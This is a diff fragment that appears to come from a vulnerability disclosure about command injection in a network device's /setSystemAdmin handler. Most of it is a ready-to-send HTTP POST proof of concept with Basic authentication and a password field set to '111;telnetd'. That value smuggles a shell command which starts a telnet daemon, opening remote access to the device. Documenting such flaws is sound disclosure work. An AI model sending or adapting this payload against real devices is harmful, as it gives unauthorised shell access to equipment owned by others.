@@ -36,3 +36,21 @@ The AdminID parameter is directly taken from user input and inserted into shell 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770376777391-dc15bc12-c090-400f-bc58-b21bcc422627.png)
 
+```
+POST /setSystemAdmin HTTP/1.1
+Host: 192.168.0.2
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://192.168.0.2/advanced.htm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Origin: http://192.168.0.2
+Authorization: Basic YWRtaW46MjJiOWRoY2Y=
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=admin&AdminPassword=111;telnetd&ConfigSystemAdmin=Save
+```
